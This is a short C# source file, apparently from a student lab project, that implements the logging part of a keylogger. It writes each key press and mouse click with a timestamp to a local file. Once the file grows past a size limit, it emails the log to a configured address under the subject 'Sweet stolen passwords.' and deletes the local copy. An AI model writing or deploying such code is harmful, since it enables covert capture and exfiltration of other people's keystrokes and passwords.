using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IIPU_lab8
{
	public class Logger
	{
		private readonly Controller MyController;
		private const string LogFile = "./log.log";

		public Logger(Controller cntrl)
		{
			MyController = cntrl;
		}

		public void LogKey(string keyName)
		{
			using (var streamWriter = new StreamWriter(LogFile, true))
			{
				streamWriter.WriteLine("KEY: " + DateTime.Now + ": " + keyName + "");
				streamWriter.Dispose();
			}
			CheckSize();
		}

		public void LogMouse(string keyName, string position)
		{
			using (var streamWriter = new StreamWriter(LogFile, true))
			{
				streamWriter.WriteLine("MOUSE: " + DateTime.Now + ": " + keyName + " " + " Position: " + position);
			}
			CheckSize();
		}

		private void CheckSize()
		{
			if (new FileInfo(LogFile).Length > MyController.LogFileSize)
			{
				if (!string.IsNullOrEmpty(MyController.Email))
				{
					new Emailer().SendEmail(MyController.Email, "Sweet stolen passwords.", LogFile);
					new FileInfo(LogFile).Delete();
				}
			}
		}
	}

}
